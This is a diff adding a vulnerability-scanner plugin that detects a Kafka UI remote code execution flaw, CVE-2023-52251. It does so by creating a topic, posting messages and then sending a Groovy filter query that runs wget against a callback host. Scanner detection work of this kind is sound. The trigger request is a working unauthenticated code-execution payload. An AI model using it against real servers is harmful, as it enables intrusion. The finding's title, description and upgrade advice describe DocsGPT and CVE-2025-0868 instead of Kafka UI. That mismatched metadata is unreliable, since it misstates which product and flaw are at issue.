@@ -1,0 +1,90 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "KafkaUi_CVE_2023_52251"
+  author: "joernNNN"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2023-52251"
+  }
+  severity: CRITICAL
+  title: "Remote code execution affecting DocsGPT (CVE-2025-0868)"
+  description: "DocsGPT is an AI-powered, open-source tool that has the function of streamlining the way users interact with documentation. The vulnerability allows unauthorized attackers to execute arbitrary Python code remotely on affected systems. This could potentially lead to complete system compromise, data theft, or service disruption, as the attack requires no authentication and can be executed remotely."
+  recommendation: "Update the version to 0.13.0 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2023-52251"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "create_sample_topic"
+  http_request: {
+    method: POST
+    uri: "/api/clusters/local/topics"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"name\":\"topic\",\"partitions\":1,\"configs\":{\"cleanup.policy\":\"delete\",\"retention.bytes\":\"-1\"}}"
+  }
+}
+actions: {
+  name: "create_sample_messages"
+  http_request: {
+    method: POST
+    uri: "/api/clusters/local/topics/topic/messages"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"partition\":0,\"key\":\"123\",\"content\":\"123\",\"keySerde\":\"String\",\"valueSerde\":\"String\"}"
+  }
+}
+actions: {
+  name: "trigger_code_execution"
+  http_request: {
+    method: GET
+    uri: "/api/clusters/local/topics/topic/messages?q=new ProcessBuilder(\"wget\",\"{{ T_CBS_URI }}\").start()&filterQueryType=GROOVY_SCRIPT"
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 2000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "create_sample_topic",
+    "create_sample_messages",
+    "trigger_code_execution",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
